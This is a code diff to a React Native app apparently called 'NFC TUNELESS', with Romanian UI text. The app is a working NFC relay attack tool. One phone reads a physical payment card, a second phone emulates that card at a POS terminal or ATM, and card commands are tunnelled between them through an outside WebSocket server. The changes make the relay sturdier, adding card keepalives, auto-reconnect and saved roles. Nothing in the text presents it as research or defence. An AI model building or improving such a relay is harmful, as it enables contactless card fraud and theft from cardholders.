@@ -1,26 +1,40 @@
 import{useState,useRef,useEffect,useCallback}from'react';
+import{AsyncStorage}from'react-native';
 import{View,Text,TouchableOpacity,ScrollView,StyleSheet,StatusBar,NativeModules,NativeEventEmitter,Platform,AppState}from'react-native';
 import{SafeAreaView}from'react-native-safe-area-context';
-import NfcManager,{NfcTech,NfcEvents}from'react-native-nfc-manager';
+import NfcManager,{NfcTech}from'react-native-nfc-manager';
 
-const C={bg0:'#03060A',bg1:'#080F18',bg2:'#0D1A2A',b1:'#1A2E45',c1:'#00D4FF',c2:'#FF6600',c3:'#39FF14',c4:'#FF2D78',t2:'#7FA8CC',t3:'#3D6080'};
+const C={bg0:'#03060A',bg1:'#080F18',bg2:'#0D1A2A',b1:'#1A2E45',b2:'#1F3A55',c1:'#00D4FF',c2:'#FF6600',c3:'#39FF14',c4:'#FF2D78',c5:'#A855F7',t1:'#E2EEF9',t2:'#7FA8CC',t3:'#3D6080'};
 const SERVER_URL='wss://nfctuneless.serveousercontent.com';
 
 function bH(b=[]){return Array.from(b).map(x=>(x&0xFF).toString(16).toUpperCase().padStart(2,'0')).join('')}
 function hB(h=''){const c=h.replace(/\s/g,'');return Array.from({length:c.length/2},(_,i)=>parseInt(c.substring(i*2,i*2+2),16))}
 function fT(ts){const d=new Date(ts);return`${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`}
 
+// Reset complet NFC - rezolva "only one card at a time"
+async function resetNfc(){
+try{await NfcManager.cancelTechnologyRequest();}catch(e){}
+try{await NfcManager.unregisterTagEvent();}catch(e){}
+try{await NfcManager.stop();}catch(e){}
+await new Promise(r=>setTimeout(r,600));
+try{await NfcManager.start();}catch(e){}
+await new Promise(r=>setTimeout(r,200));
+}
+
 export default function App(){
 const[mode,setMode]=useState(null);
+const[loading,setLoading]=useState(true);
 const ws=useRef(null);
 const pending=useRef({});
 const isoDepRef=useRef(null);
 const readerRelay=useRef(false);
 const hceEmitterRef=useRef(null);
+const keepAliveRef=useRef(null);
 const autoRestartRef=useRef(true);
 const clientsRef=useRef([]);
 const myIdRef=useRef(null);
 const modeRef=useRef(null);
+const connectingCard=useRef(false);
 const connectingHce=useRef(false);
 
 const[st,setSt]=useState('disconnected');
@@ -40,78 +54,140 @@ useEffect(()=>{modeRef.current=mode;},[mode]);
 useEffect(()=>{clientsRef.current=clients;},[clients]);
 useEffect(()=>{myIdRef.current=myId;},[myId]);
 
+// Restaurare rol salvat
+useEffect(()=>{
+(async()=>{
+try{
+const saved=await AsyncStorage.getItem('role');
+if(saved==='A'||saved==='B'){setMode(saved);}
+}catch(e){}
+setLoading(false);
+})();
+},[]);
+
 // NFC Init
 useEffect(()=>{
 let mounted=true;
-(async()=>{
-await new Promise(r=>setTimeout(r,1000));
-if(!mounted)return;
+const initNfc=async()=>{
 try{
+await new Promise(r=>setTimeout(r,1000));
 let ok=false;
 try{ok=await NfcManager.isSupported();}catch(e){ok=true;}
 setNfcOk(ok);
-if(ok){try{await NfcManager.start();}catch(e){}}
+if(ok){
+try{await NfcManager.start();}catch(e){}
+}
 }catch(e){}
-})();
+};
+initNfc();
 return()=>{
 mounted=false;
 autoRestartRef.current=false;
 try{NfcManager.cancelTechnologyRequest();}catch(e){}
-try{NfcManager.unregisterTagEvent();}catch(e){}
+if(keepAliveRef.current)clearInterval(keepAliveRef.current);
 };
 },[]);
 
-// Detectare card prin NfcEvents - fara vibratii, detecteaza prezenta si absenta
-const startCardListener=useCallback(()=>{
+// Disconnect card complet
+const disconnectCard=useCallback(async()=>{
+if(keepAliveRef.current){clearInterval(keepAliveRef.current);keepAliveRef.current=null;}
+readerRelay.current=false;
+isoDepRef.current=null;
+setCardOk(false);
+await resetNfc();
+},[]);
+
+// Connect card fizic (Telefon B)
+const connectCard=useCallback(async()=>{
+if(connectingCard.current)return;
+connectingCard.current=true;
+
+try{
+// Reset complet inainte de orice
+await disconnectCard();
 addLog('Așteaptă card...',C.t2);
 
-NfcManager.setEventListener(NfcEvents.DiscoverTag,(tag)=>{
-if(!tag)return;
+await NfcManager.requestTechnology([NfcTech.IsoDep]);
+const tag=await NfcManager.getTag();
+if(!tag)throw new Error('Tag null');
+
 isoDepRef.current=tag;
 readerRelay.current=true;
 setCardOk(true);
-addLog('✅ Card detectat! Relay activ.',C.c3);
-});
+addLog('✅ Card conectat! Relay activ.',C.c3);
 
-NfcManager.setEventListener(NfcEvents.SessionClosed,()=>{
-if(!readerRelay.current)return;
+// Keepalive card
+keepAliveRef.current=setInterval(async()=>{
+if(!readerRelay.current){
+clearInterval(keepAliveRef.current);
+keepAliveRef.current=null;
+return;
+}
+try{
+await NfcManager.isoDepHandler.transceive(hB('0084000004'));
+}catch(e){
+clearInterval(keepAliveRef.current);
+keepAliveRef.current=null;
 readerRelay.current=false;
 isoDepRef.current=null;
 setCardOk(false);
-addLog('Card îndepărtat! Reconectare...',C.c4);
-if(autoRestartRef.current)setTimeout(()=>startCardListener(),500);
-});
+addLog('Card deconectat! Reconectare...',C.c4);
+await resetNfc();
+if(autoRestartRef.current){
+connectingCard.current=false;
+setTimeout(()=>connectCard(),500);
+}
+}
+},2000);
 
-NfcManager.registerTagEvent();
-},[addLog]);
+}catch(e){
+await disconnectCard();
+if(e.message!=='cancelled'){
+addLog(`Eroare: ${e.message}`,C.c4);
+if(autoRestartRef.current){
+connectingCard.current=false;
+setTimeout(()=>connectCard(),1000);
+return;
+}
+}
+}
+connectingCard.current=false;
+},[addLog,disconnectCard]);
 
-const stopCardListener=useCallback(()=>{
-try{NfcManager.unregisterTagEvent();}catch(e){}
-try{NfcManager.setEventListener(NfcEvents.DiscoverTag,null);}catch(e){}
-try{NfcManager.setEventListener(NfcEvents.SessionClosed,null);}catch(e){}
-readerRelay.current=false;
-isoDepRef.current=null;
-setCardOk(false);
-},[]);
-
-// Stop HCE
+// Stop HCE complet
 const stopHce=useCallback(()=>{
-if(hceEmitterRef.current){try{hceEmitterRef.current.remove();}catch(e){}hceEmitterRef.current=null;}
+if(hceEmitterRef.current){
+try{hceEmitterRef.current.remove();}catch(e){}
+hceEmitterRef.current=null;
+}
 const{HceModule}=NativeModules;
-if(HceModule){try{HceModule.setActive(false);}catch(e){}}
+if(HceModule){
+try{HceModule.setActive(false);}catch(e){}
+}
 setHceActive(false);
 connectingHce.current=false;
 addLog('Emulator oprit',C.c2);
 },[addLog]);
 
-// Start HCE
+// Start HCE (Telefon A)
 const startHce=useCallback(()=>{
 if(connectingHce.current)return;
 connectingHce.current=true;
+
 const{HceModule}=NativeModules;
-if(!HceModule){addLog('HCE indisponibil!',C.c4);connectingHce.current=false;return;}
+if(!HceModule){
+addLog('HCE indisponibil!',C.c4);
+connectingHce.current=false;
+return;
+}
+
+// Reset complet HCE
 try{HceModule.setActive(false);}catch(e){}
-if(hceEmitterRef.current){try{hceEmitterRef.current.remove();}catch(e){}hceEmitterRef.current=null;}
+if(hceEmitterRef.current){
+try{hceEmitterRef.current.remove();}catch(e){}
+hceEmitterRef.current=null;
+}
+
 setTimeout(()=>{
 try{
 HceModule.setActive(true);
@@ -157,7 +233,23 @@ if(autoRestartRef.current)setTimeout(()=>startHce(),1000);
 },500);
 },[addLog]);
 
-// WebSocket
+const toggleHce=useCallback(()=>{
+if(hceActive)stopHce();
+else startHce();
+},[hceActive,startHce,stopHce]);
+
+const toggleCard=useCallback(async()=>{
+if(cardOk){
+autoRestartRef.current=false;
+await disconnectCard();
+addLog('Card deconectat manual',C.c2);
+autoRestartRef.current=true;
+}else{
+await connectCard();
+}
+},[cardOk,connectCard,disconnectCard,addLog]);
+
+// WebSocket connect
 const connect=useCallback(()=>{
 if(ws.current&&ws.current.readyState===1){ws.current.close();ws.current=null;return;}
 setSt('connecting');
@@ -175,7 +267,7 @@ const{HceModule}=NativeModules;
 HceModule?.startForegroundService&&HceModule.startForegroundService();
 }
 if(modeRef.current==='A')setTimeout(()=>startHce(),1500);
-else if(modeRef.current==='B')setTimeout(()=>startCardListener(),1500);
+else if(modeRef.current==='B')setTimeout(()=>connectCard(),1500);
 };
 s.onclose=()=>{
 setSt('disconnected');ws.current=null;
@@ -203,11 +295,9 @@ addLog(`Card→ ${respHex.slice(0,16)}`,C.c3);
 }catch(e){
 ws.current?.send(JSON.stringify({type:'APDU_RELAY_RESPONSE',requestId:m.requestId,apdu:'6F00'}));
 addLog(`Card ERR: ${e.message}`,C.c4);
-readerRelay.current=false;
-isoDepRef.current=null;
-setCardOk(false);
-addLog('Card deconectat! Reconectare...',C.c4);
-if(autoRestartRef.current)setTimeout(()=>startCardListener(),500);
+await disconnectCard();
+addLog('Reconectare card...',C.c4);
+if(autoRestartRef.current)setTimeout(()=>connectCard(),500);
 }
 })();
 }
@@ -226,7 +316,7 @@ break;
 }catch{}
 };
 }catch{setSt('disconnected');}
-},[addLog,startHce,startCardListener]);
+},[addLog,startHce,connectCard,disconnectCard]);
 
 useEffect(()=>{
 const sub=AppState.addEventListener('change',(state)=>{
@@ -261,17 +351,17 @@ return(
 <View style={s.center}>
 <Text style={s.title}>NFC TUNELESS</Text>
 <Text style={s.subtitle}>Selectează rolul acestui telefon</Text>
-<TouchableOpacity style={[s.roleCard,{borderColor:C.c1}]} onPress={()=>setMode('A')}>
+<TouchableOpacity style={[s.roleCard,{borderColor:C.c1}]} onPress={()=>{setMode('A');try{AsyncStorage.setItem('role','A');}catch(e){}}}>
 <Text style={s.roleIcon}>📱</Text>
 <Text style={[s.roleTitle,{color:C.c1}]}>TELEFON A</Text>
 <Text style={s.roleDesc}>Lângă POS / ATM</Text>
 <Text style={s.roleDesc2}>Emulează cardul automat</Text>
 </TouchableOpacity>
-<TouchableOpacity style={[s.roleCard,{borderColor:C.c3,marginTop:20}]} onPress={()=>setMode('B')}>
+<TouchableOpacity style={[s.roleCard,{borderColor:C.c3,marginTop:20}]} onPress={()=>{setMode('B');try{AsyncStorage.setItem('role','B');}catch(e){}}}>
 <Text style={s.roleIcon}>💳</Text>
 <Text style={[s.roleTitle,{color:C.c3}]}>TELEFON B</Text>
 <Text style={s.roleDesc}>Lângă cardul fizic</Text>
-<Text style={s.roleDesc2}>Detectează cardul automat</Text>
+<Text style={s.roleDesc2}>Conectează cardul automat</Text>
 </TouchableOpacity>
 </View>
 </SafeAreaView>
@@ -307,12 +397,20 @@ return(
 <View style={[s.statusCard,{borderColor:mode==='A'?(hceActive?C.c3:C.c4):(cardOk?C.c3:C.t3)}]}>
 <Text style={s.statusIcon}>{mode==='A'?(hceActive?'✅':'⏳'):(cardOk?'✅':'⏳')}</Text>
 <Text style={[s.statusMain,{color:mode==='A'?(hceActive?C.c3:C.t2):(cardOk?C.c3:C.t2)}]}>
-{mode==='A'?(hceActive?'EMULATOR ACTIV':'PORNIRE...'):(cardOk?'CARD DETECTAT':'AȘTEAPTĂ CARD...')}
+{mode==='A'?(hceActive?'EMULATOR ACTIV':'PORNIRE...'):(cardOk?'CARD CONECTAT':'AȘTEAPTĂ CARD...')}
 </Text>
 <Text style={s.statusSub}>
-{mode==='A'?(hceActive?'Apropie de POS/ATM':'Se configurează...'):(cardOk?'Relay activ - ține cardul lipit':'Apropie cardul de telefon')}
+{mode==='A'?(hceActive?'Apropie de POS/ATM':'Se configurează...'):(cardOk?'Relay activ - nu mișca cardul':'Apropie cardul de telefon')}
 </Text>
 </View>
+<TouchableOpacity
+style={[s.manualBtn,{borderColor:mode==='A'?(hceActive?C.c4:C.c1):(cardOk?C.c4:C.c3)}]}
+onPress={mode==='A'?toggleHce:toggleCard}
+disabled={st!=='connected'}>
+<Text style={[s.manualBtnTxt,{color:mode==='A'?(hceActive?C.c4:C.c1):(cardOk?C.c4:C.c3)}]}>
+{mode==='A'?(hceActive?'⏹ OPREȘTE':'▶ PORNEȘTE MANUAL'):(cardOk?'⏹ DECONECTEAZĂ':'💳 CONECTEAZĂ MANUAL')}
+</Text>
+</TouchableOpacity>
 {!otherConnected&&(
 <View style={s.warning}>
 <Text style={s.warningTxt}>⚠️ {mode==='A'?'Telefonul B':'Telefonul A'} nu e conectat!</Text>
@@ -334,9 +432,10 @@ return(
 <TouchableOpacity style={s.changeRole} onPress={async()=>{
 autoRestartRef.current=false;
 stopHce();
-stopCardListener();
+await disconnectCard();
 if(ws.current){ws.current.close();ws.current=null;}
-setSt('disconnected');setMode(null);
+setSt('disconnected');
+setMode(null);
 }}>
 <Text style={{fontFamily:'monospace',fontSize:10,color:C.t3}}>← SCHIMBĂ ROLUL</Text>
 </TouchableOpacity>
@@ -369,6 +468,8 @@ statusCard:{borderWidth:2,borderRadius:12,padding:24,alignItems:'center',marginB
 statusIcon:{fontSize:48,marginBottom:8},
 statusMain:{fontFamily:'monospace',fontSize:16,fontWeight:'bold',letterSpacing:2,marginBottom:4,textAlign:'center'},
 statusSub:{fontFamily:'monospace',fontSize:11,color:C.t3,textAlign:'center'},
+manualBtn:{borderWidth:1,borderRadius:8,padding:12,alignItems:'center',marginBottom:12},
+manualBtnTxt:{fontFamily:'monospace',fontSize:12,letterSpacing:1},
 warning:{backgroundColor:'rgba(255,190,0,0.1)',borderWidth:1,borderColor:'#FFBE00',borderRadius:6,padding:10,marginBottom:12,alignItems:'center'},
 warningTxt:{fontFamily:'monospace',fontSize:11,color:'#FFBE00'},
 logCard:{backgroundColor:C.bg2,borderWidth:1,borderColor:C.b1,borderRadius:8,padding:12},
